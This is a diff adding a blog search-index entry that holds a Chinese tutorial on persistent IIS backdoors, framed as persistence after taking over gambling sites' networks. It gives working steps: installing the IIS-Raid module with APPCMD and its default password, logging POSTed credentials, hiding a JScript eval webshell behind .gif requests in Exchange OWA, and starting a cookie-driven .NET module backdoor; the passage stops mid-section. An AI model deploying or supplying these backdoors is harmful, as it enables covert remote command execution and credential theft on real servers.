@@ -1,6 +1,331 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>基于 IIS 的持久化</title>
+    <url>/IIS/IIS%E5%90%8E%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打BC，菠菜站到内网拿下域之后，就要做持久化，所以应用面还是广阔的。（<del>毕竟不是打下了就开始收网的</del>）</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownce4d9d7c3f8eb1d1b47eaeaccfa63753be8d4280.jpg@1200w_630h_1e_1c_1f.jpg"></p>
+<span id="more"></span>
+
+<h1 id="IIS-概述"><a href="#IIS-概述" class="headerlink" title="IIS 概述"></a>IIS 概述</h1><p>根据微软官方给出的<a href="https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524901(v=vs.90)">IIS Request Processing</a>，可以看到几个关键点：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219151349.png"></p>
+<p>分别是 <code>HTTP.sys</code> , <code>kernel-mode</code> , <code>ISAPI</code> , <code>The worker process</code></p>
+<h2 id="HTTP-sys"><a href="#HTTP-sys" class="headerlink" title="HTTP.sys"></a>HTTP.sys</h2><p>微软官方在<a href="https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture#hypertext-transfer-protocol-stack-httpsys">Introduction to IIS Architectures</a>对HTTP.sys的介绍：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219152138.png"></p>
+<p>我们可以得到一些有效信息，如：</p>
+<ol>
+<li>网络请求到达HTTP.sys之后，经过一系列处理，再交由IIS进行处理；</li>
+<li>http.sys工作在内核上，性能很高；</li>
+</ol>
+<h2 id="w3wp-exe"><a href="#w3wp-exe" class="headerlink" title="w3wp.exe"></a>w3wp.exe</h2><p>请求进入iis的请求队列后，交由对应的w3wp.exe进程进行处理</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219155603.png"></p>
+<p>W3wp根据请求的文件后缀，判断类型后，交由不同的逻辑进行处理，也就是最上面提及的ASP,ISAPI,CGI等。在这之前还有对请求的一系列处理，包括匿名请求处理，日志记录等。</p>
+<p>W3WP相关的配置一般在，<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
+<p>可以看到一些对请求的修饰及处理：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219160508.png"></p>
+<h2 id="ISAPI"><a href="#ISAPI" class="headerlink" title="ISAPI"></a>ISAPI</h2><p>同样在applicationHost.config里我们可以看到将.aspx文件交由isapi进行处理：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219161041.png"></p>
+<p>Aspnet_isapi.dll由c编写，为iis的模块。</p>
+<p>在 <code>.net</code> 目录 <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config</code> 下也可以看到一个 <code>web.config</code> ，其中也有 <code>isapi</code> 的映射关系：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219161346.png"></p>
+<p>对应后缀对应c#的一些type，相对操作空间大一些。</p>
+<h2 id="module和hanlder"><a href="#module和hanlder" class="headerlink" title="module和hanlder"></a>module和hanlder</h2><p>在上面我们看到对于.aspx文件最后由 <code>System.Web.UI.PageHandlerFactory</code> 进行处理，该类根据后缀生成对应的 <code>webhanlder</code> 来处理请求。对于 <code>hanlder</code> 也不会陌生，常见的ashx就是通过继承handler来实现的。此外我发现配置文件中还有很多 <code>modules</code> 的存在。关于 <code>module</code> 和 <code>handler</code> 的关系，<a href="https://learn.microsoft.com/en-us/previous-versions/aspnet/bb398986(v=vs.100)">微软也有明确说明</a>：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219163545.png"></p>
+<p>每个请求都会经过多个module来处理，最后交由一个handler进行处理。结合前面默认module所带的功能，我们能感觉到module一般是做类似修饰请求、预检请求之类的工作。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219163806.png"></p>
+<p>也就是说module也可以修改响应包。</p>
+<p>配置文件中module的格式：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">httpModules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">type</span>=<span class="string">&quot;[COM+ Class], [Assembly]&quot;</span> <span class="attr">name</span>=<span class="string">&quot;[ModuleName]&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">remove</span> <span class="attr">type</span>=<span class="string">&quot;[COM+ Class], [Assembly]&quot;</span> <span class="attr">name</span>=<span class="string">&quot;[ModuleName]&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">clear</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">httpModules</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>配置文件中hanlder的格式：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">httpHandlers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">verb</span>=<span class="string">&quot;[verb list]&quot;</span> <span class="attr">path</span>=<span class="string">&quot;[path/wildcard]&quot;</span> <span class="attr">type</span>=<span class="string">&quot;[COM+ Class], [Assembly]&quot;</span> <span class="attr">validate</span>=<span class="string">&quot;[true/false]&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">remove</span> <span class="attr">verb</span>=<span class="string">&quot;[verb list]&quot;</span> <span class="attr">path</span>=<span class="string">&quot;[path/wildcard]&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">clear</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">httpHandlers</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219164850.png"></p>
+<p>可以看到继承了 <code>IhttpAsyncHanlder</code> 和 <code>IHttpHanler</code> ，实际上最终也是 <code>hanlder</code> 。  </p>
+<p>包括Page对象，同样继承了handler，这在冰蝎中也有应用</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219164655.png"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221220111420.png" alt="IIS 整体的请求"></p>
+<ol>
+<li>用户访问请求到达 <code>HTTP.SYS</code> ;</li>
+<li>通过 <code>svchost.exe</code> 加载 <code>applicationhost.config</code> ，其中包括请求预处理的 <code>module</code> 和 <code>iaspi</code> 映射关系; </li>
+<li>经过 <code>w3wp</code> 执行 <code>modules</code>，移交给 <code>.net</code> 进行处理;</li>
+</ol>
+<p>对应版本的.net根据自身配置定义 <code>isapi</code> ，加载修饰请求的module移交给对应的 <code>hanlder</code> 进行处理。</p>
+<h1 id="HTTP-SYS-后门"><a href="#HTTP-SYS-后门" class="headerlink" title="HTTP.SYS 后门"></a>HTTP.SYS 后门</h1><p>主要是可以和iis进行端口复用。注册一个新的url端点不影响原本iis web应用的使用</p>
+<ol>
+<li><a href="https://paper.seebug.org/1692/">修改横向移动手段winrm的默认端口为443与IIS进行端口复用，实现隐蔽后门</a></li>
+<li><a href="https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html">通过c#反序列化漏洞直接植入listener内存后门</a></li>
+<li><a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/servers/httpsys?view=aspnetcore-6.0">DotNet core 端口复用样例</a></li>
+</ol>
+<h1 id="IIS模块后门-T1505"><a href="#IIS模块后门-T1505" class="headerlink" title="IIS模块后门[T1505]"></a>IIS模块后门[T1505]</h1><p>根据《IIS请求流程和渗透测试中的应用》中讲解，在IIS处理web请求的时候，先通过http.sys处理之后，再到后面的svchost和w3wp进行处理。那么根据处理流程， 在http.sys处理完后交给iis模块处理，主要由c++实现，可hook所有到达iis的请求。</p>
+<p>配置方法主要通过修改 <code>C:\Windows\System32\inetsrv\config\applicationHost.config</code> 或 <code>appcmd</code> 命令实现。</p>
+<p>以前好像看过文章很多黑产团队喜欢用这种后门，因为可以进行定制化的功能。比如判断ua或者源ip等条件，符合条件才响应，否则是正常的功能。</p>
+<blockquote>
+<p><a href="https://attack.mitre.org/techniques/T1505/004/">目前该方法已被att&amp;ck归类</a></p>
+</blockquote>
+<p><a href="https://github.com/0x09AL/IIS-Raid">GitHub项目地址</a></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219175024.png"></p>
+<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><h3 id="自定义密码"><a href="#自定义密码" class="headerlink" title="自定义密码"></a>自定义密码</h3><p>在Function.h中的PASSWORD字段，默认密码为SIMPLEPASS</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219181711.png"></p>
+<p>防止自己布置的后门被其他人利用，可以修改成自己的密码。</p>
+<h3 id="DLL编译"><a href="#DLL编译" class="headerlink" title="DLL编译"></a>DLL编译</h3><p>Visual Studio 2022 打开之后 文件-打开-项目&#x2F;解决方案，选择 IISRaid-modules-IIS-Backdoor.vcxproj</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219180133.png"></p>
+<p>注意：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219180254.png"></p>
+<p>出这个问题之前一般Visual Studio 2022会提示你升级，点确认就行。</p>
+<p>之后即可完成编译。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219181814.png"></p>
+<p>在 <code>x64-Debug</code> 下找到该编译成功的dll后门。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219182249.png"></p>
+<p>成功编译。</p>
+<h2 id="DLL部署-能命令执行的情况"><a href="#DLL部署-能命令执行的情况" class="headerlink" title="DLL部署(能命令执行的情况)"></a>DLL部署(能命令执行的情况)</h2><p>在192.168.91.20的exchange上留一个蚁剑的shell</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219192113.png"></p>
+<p>连接的时候注意勾选忽略https证书。上传编译好的dll文件。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219183723.png"></p>
+<p>shell执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module  /image:<span class="string">&quot;c:\IIS-Backdoor.dll&quot;</span> /add:<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown64-ds1110.png"></p>
+<p>尝试客户端连接服务端。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 iis_controller.py --url htts://192.168.91.20 --password SIMPLEPASS</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219184420.png"></p>
+<p>此时脚本执行报错。原因是原始的项目脚本中没有针对证书做验证，简单修改一下代码，忽略证书认证。</p>
+<h3 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h3><p>在54和56行的GET和POST请求后加上verify&#x3D;False以忽略https证书。如下图：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219184652.png"></p>
+<p>此时再去执行脚本。成功执行。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown640.jpg"></p>
+<h3 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h3><p>因为这个请求在http.sys这一步被hook，就是iis是正常的话，无所谓证书与否。命令改为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 iis_controller.py --url http://192.168.91.20 --password SIMPLEPASS</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown640%20(1).png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219185135.png"></p>
+<p>代码判断状态码不为200就退出，判断逻辑存在问题，403是应用程序给的响应，但是iis后门只需要iis能正常运行即可使用，所以注释掉这段判断逻辑。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219185213.png"></p>
+<p>修改完连接成功并执行命令成功。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown640-gfd-1.png"></p>
+<p>在执行结果带中文的时候，脚本会报错，主要是因为python3的原因，可以将此处的utf-8改为gb2312</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219190831.png"></p>
+<p>正常执行</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown6401-1-2s.png"></p>
+<h2 id="密码记录"><a href="#密码记录" class="headerlink" title="密码记录"></a>密码记录</h2><p>该后门还有一个记住密码的功能，主要是对POST请求发送的数据进行记录，记录在 <code>C:\\Windows\\Temp\\creds.db</code></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219185901.png"></p>
+<p>但是因为exchange的请求不是常规的基于表单的认证，basic或ntlm认证，所以这里curl发送一个post请求</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST --data password=1 -k https://192.168.91.20</span><br></pre></td></tr></table></figure>
+
+<p>在exchange服务器上出现该新增文件</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown640-123s.png"></p>
+<p>同时后门也能进行记录的获取。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown64-1-asdd-110.png"></p>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>看了下该项目的源码，感觉还有很多地方可以操作的，实战最好不要一模一样的搬上去用。</p>
+<h1 id="net-ISAPI-后门-T1505"><a href="#net-ISAPI-后门-T1505" class="headerlink" title=".net ISAPI 后门[T1505]"></a>.net ISAPI 后门[T1505]</h1><p><a href="https://github.com/Ivan1ee/NetDLLSpy">在.net处理层面修改某后缀处理的hanlder</a></p>
+<p>配置方法主要通过修改对应版本的.net配置文件 <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config</code> 实现。</p>
+<blockquote>
+<p><a href="https://attack.mitre.org/techniques/T1505/004/">目前该方法已被att&amp;ck归类</a></p>
+</blockquote>
+<h2 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h2><p>操作环境：<code>server 2016</code> + <code>exchange</code> 以exchange的owa模块来部署后门 部署路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</span><br></pre></td></tr></table></figure>
+
+<p>新建bin目录，将项目中已经编译好的dll放入</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219192709.png"></p>
+<p>在该路径下新建一个web.config文件，文件内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;PageHandlerFactory-ISAPI-2.0-32&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*. gif&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">type</span>=<span class="string">&quot;IsapiModules Handler&quot;</span> <span class="attr">Condition</span>=<span class="string">&quot;integratedMode&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在iis的映射管理来看，恶意的dll伪装成正常的功能</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219193648.png"></p>
+<p>此时在auth下访问任意的gif文件（只要结尾是gif即可）</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219193720.png"></p>
+<p>尝试使用dll功能</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://192.168.91.20/owa/auth/1.gif?a=c&amp;p=cmd.txt&amp;c=ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>图片显示正常</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219193830.png"></p>
+<p>在服务器目录下生成了一个cmd.txt</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219193907.png"></p>
+<p>内容为执行的ipconfig的命令结果</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E6%88%AA%E5%9B%BE%E5%85%AB1111.png"></p>
+<h2 id="完成-antsword-的连接"><a href="#完成-antsword-的连接" class="headerlink" title="完成 antsword 的连接"></a>完成 antsword 的连接</h2><p>与上一步操作大同小异 自己编译一下c#代码</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">import System; </span><br><span class="line">import System.Web; </span><br><span class="line">import System.IO; </span><br><span class="line"></span><br><span class="line">package IsapiModu1e</span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Handler</span> <span class="title">implements</span> <span class="title">IHttpHandler</span></span><br><span class="line">  &#123; </span><br><span class="line">    function IHttpHandler.ProcessRequest(context : HttpContext)</span><br><span class="line">    &#123; </span><br><span class="line">      context.Response.Write(<span class="string">&quot;If i am DJ,Will u love me&quot;</span>) </span><br><span class="line"><span class="keyword">var</span> I = context; <span class="keyword">var</span> Request = I.Request; <span class="keyword">var</span> Response = I.Response; <span class="keyword">var</span> Server = I.Server; eval(context.Request[<span class="number">1</span>]); &#125; function <span class="keyword">get</span> IHttpHandler.IsReusable() : Boolean&#123; <span class="keyword">return</span> <span class="literal">true</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\jsc.exe /t:library <span class="literal">-out</span>:C:\Users\Administrator\Desktop\IsapiModu1e.Handler.dll C:\Users\Administrator\Desktop\IsapiModu1e.Handler.js</span><br></pre></td></tr></table></figure>
+
+<p><code>C:\Users\Administrator\Desktop\IsapiModu1e.Handler.js</code> 编译成dll文件，并放在owa的bin文件夹下。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219194420.png"></p>
+<p>修改auth目录下的web.config文件</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219194557.png"></p>
+<p>访问 <code>https://192.168.91.20/owa/auth/xxx.gif</code> ，后蚁剑直接连接</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219194722.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221219194900.png"></p>
+<h1 id="net-module后门"><a href="#net-module后门" class="headerlink" title=".net module后门"></a>.net module后门</h1><p><a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/developing-iis-modules-and-handlers-with-the-net-framework#two-ways-to-extend-iis-module-vs-handler">根据微软的文档</a>，iis开发功能分为两种，分别是<code>IIS module</code>和<code>IIS handler</code>，即IIS模块和IIS处理程序。</p>
+<p>IIS模块是一个.NET类，<a href="https://learn.microsoft.com/en-us/dotnet/api/system.web.ihttpmodule?view=netframework-4.8">该类实现ASP.NET</a><code>System.Web.IHttpModule</code>接口，并使用<code>System.Web</code>命名空间中的API参与一个或多个ASP.NET的请求处理阶段。</p>
+<p>IIS处理程序也是一个类，<a href="https://learn.microsoft.com/en-us/dotnet/api/system.web.ihttphandler?view=netframework-2.0">该类实现ASP.NET</a><code>System.Web.IHttpHandler</code>或<code>System.Web.IHttpAsyncHandler</code>接口，并使用<code>System.Web</code>命名空间中的API为其支持的特定内容生成http响应。</p>
+<p>IIS处理程序负责将请求提供给特定的url或特定扩展名，IIS模块则应用于基于任意规则的所有或某些请求。本文以IIS模块为例开发IIS后门实现从Cookie中获取cmd命令并执行。</p>
+<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><ol>
+<li>Visual Studio 2022</li>
+<li>.Net 4.8</li>
+</ol>
+<p>使用.Net4.8是可以向后兼容，在<a href="https://learn.microsoft.com/zh-cn/dotnet/framework/migration-guide/version-compatibility">微软官方文档</a>中：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221220204607.png"></p>
+<blockquote>
+<p>所以实际使用时，配置指向即可，尽量不用使用.net4.0特性</p>
+</blockquote>
+<h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><p>先创建一个C# .NET Framework项目</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221220195217.png"></p>
+<p>选用.net 4.8的环境</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221220204831.png"></p>
+<p>添加System.Web.dll的引用</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221220205031.png"></p>
+<p>然后实现IHttpModule接口</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Class1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>两个接口分别负责模块的两个生命周期</p>
+<ol>
+<li>Init 模块初始化</li>
+<li>Dispose 请求销毁</li>
+</ol>
+<p>Init()方法接受一个HttpApplication参数，此参数代表请求的上下文。其中HttpApplication中有一个订阅事件PreRequestHandlerExecute，该事件字面意思就是在请求之前进行处理。</p>
+<p>值得一提的是HttpApplication还有很多别的事件</p>
+<table>
+<thead>
+<tr>
+<th align="center">事件名称</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">BeginRequest</td>
+<td align="center">Asp.net处理的第一个事件，表示处理的开始</td>
+</tr>
+<tr>
+<td align="center">AuthenticateRequest</td>
+<td align="center">验证请求，一般用来取得请求用户的信息</td>
+</tr>
+<tr>
+<td align="center">PostAuthenticateRequest</td>
+<td align="center">已经获取请求用户的信息</td>
+</tr>
+<tr>
+<td align="center">AuthorizeRequest</td>
+<td align="center">授权，一般用来检查用户的请求是否获得权限</td>
+</tr>
+<tr>
+<td align="center">PostAuthorizeRequest</td>
+<td align="center">用户请求已经得到授权</td>
+</tr>
+<tr>
+<td align="center">ResolveRequestCache</td>
+<td align="center">获取以前处理缓存的处理结果，如果以前缓存过，那么，不必再进行请求的处理工作，直接返回缓存结果</td>
+</tr>
+<tr>
+<td align="center">PostResolveRequestCache</td>
+<td align="center">已经完成缓存的获取操作</td>
+</tr>
+<tr>
+<td align="center">PostMapRequestHandler</td>
+<td align="center">已经根据用户的请求，创建了处理请求的处理器对象</td>
+</tr>
+<tr>
+<td align="center">AcquireRequestState</td>
+<td align="center">取得请求的状态，一般用于Session</td>
+</tr>
+<tr>
+<td align="center">PostAcquireRequestState</td>
+<td align="center">已经取得了Session</td>
+</tr>
+<tr>
+<td align="center">PreRequestHandlerExecute</td>
+<td align="center">准备执行处理程序</td>
+</tr>
+<tr>
+<td align="center">PostRequestHandlerExecute</td>
+<td align="center">已经执行了处理程序</td>
+</tr>
+<tr>
+<td align="center">ReleaseRequestState</td>
+<td align="center">释放请求的状态</td>
+</tr>
+<tr>
+<td align="center">PostReleaseRequestState</td>
+<td align="center">已经释放了请求的状态</td>
+</tr>
+<tr>
+<td align="center">UpdateRequestCache</td>
+<td align="center">更新缓存</td>
+</tr>
+<tr>
+<td align="center">PostUpdateRequestCache</td>
+<td align="center">已经更新了缓存</td>
+</tr>
+<tr>
+<td align="center">LogRequest</td>
+<td align="center">请求的日志操作</td>
+</tr>
+<tr>
+<td align="center">PostLogRequest</td>
+<td align="center">已经完成了请求的日志操作</td>
+</tr>
+<tr>
+<td align="center">EndRequest</td>
+<td align="center">本次请求处理完成</td>
+</tr>
+</tbody></table>
+<p>PreRequestHandlerExecute是一个事件，其类型为EventHandler。</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> EventHandler PreRequestHandlerExecute;</span><br></pre></td></tr></table></figure>
+
+<p>而EventHandler是定义的一个委托</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">EventHandler</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>新建一个事件</p>
